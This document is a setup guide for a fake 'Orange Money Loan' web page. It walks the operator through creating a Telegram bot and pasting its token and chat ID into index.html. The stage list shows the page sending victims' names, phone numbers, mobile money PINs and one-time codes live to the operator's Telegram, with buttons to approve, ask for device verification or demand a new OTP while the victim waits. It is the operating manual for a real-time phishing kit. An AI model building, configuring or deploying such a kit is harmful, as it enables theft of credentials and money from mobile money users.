# TELEGRAM BOT CONFIGURATION GUIDE

## 📌 How to Get Your Telegram Bot Token and Chat ID

### Step 1: Create Your Bot

1. Open Telegram and search for **@BotFather**
2. Send the command `/start`
3. Send `/newbot`
4. Follow the prompts:
   - Choose a name for your bot (e.g., "Orange Money Loan Bot")
   - Choose a username for your bot (must end with "bot", e.g., "orange_money_loan_bot")
5. BotFather will provide you with a **Bot Token** that looks like:
   ```
   123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh
   ```

### Step 2: Get Your Chat ID

1. Open Telegram and search for **@userinfobot**
2. Send it any message
3. It will reply with your user information including your **ID** (your Chat ID)
   - Example: `"You are user: 987654321"`

### Step 3: Configure in index.html

1. Open `index.html` in a text editor
2. Find the section (around line 400-410):
   ```javascript
   // =====================================================
   // TELEGRAM BOT CONFIGURATION
   // =====================================================
   const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
   const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
   ```

3. Replace the placeholder values:
   ```javascript
   const TELEGRAM_BOT_TOKEN = '123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh';
   const TELEGRAM_CHAT_ID = '987654321';
   ```

4. Save the file

## ✅ Testing Your Configuration

1. Open the application in your browser
2. Go through the loan application process
3. When you click "Continue" on page 2 (Personal Details), you should receive a message in Telegram with:
   - The applicant's details
   - Action buttons (APPROVED, DENY)

4. Similarly, when you proceed through other pages, messages will appear in Telegram

## 🔔 What Happens at Each Stage

### Stage 1: Application Details (Page 2 → Continue)
- **Message to Telegram**: Loan amount, name, phone, purpose
- **Bot Buttons**: APPROVED | DENY
- **User Sees**: Loading spinner

### Stage 2: Login Verification (Page 3 → Continue)
- **Message to Telegram**: Phone number and PIN
- **Bot Buttons**: APPROVED | VERIFY DEVICE | DENY
- **User Sees**: Loading spinner, then proceeds to OTP page if approved

### Stage 3: OTP Verification (Page 5 → Verify)
- **Message to Telegram**: OTP code entered by user
- **Bot Buttons**: APPROVE | WRONG OTP
- **User Sees**: Loading spinner, then congratulations page if approved

## 🚀 Deployment Notes

When deploying to production:
1. **Never commit credentials** to version control
2. Use **environment variables** to store sensitive data
3. Consider using a **backend service** to securely handle Telegram bot communication
4. Use HTTPS for all deployments

## 📞 Bot Permissions

Your bot needs these permissions:
- Send messages
- Send formatted messages (HTML)
- Send inline keyboards
- Receive updates

These are typically enabled by default.

## ⚠️ Troubleshooting

### No messages appearing in Telegram?
1. Verify bot token is correct (no extra spaces)
2. Verify chat ID is correct (should be a number)
3. Check browser console for error messages (F12 → Console)
4. Ensure internet connection is active

### Invalid token error?
- Bot token format must be: `NUMBER:ALPHANUMERIC`
- Copy directly from BotFather without any spaces

### Chat ID not working?
- Make sure you're using your user ID, not bot username
- User ID should be a number (e.g., 987654321)

## 📚 Additional Resources

- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- [BotFather Command Reference](https://core.telegram.org/bots#botfather)
- [Inline Keyboards Documentation](https://core.telegram.org/bots/features#inline-keyboards)
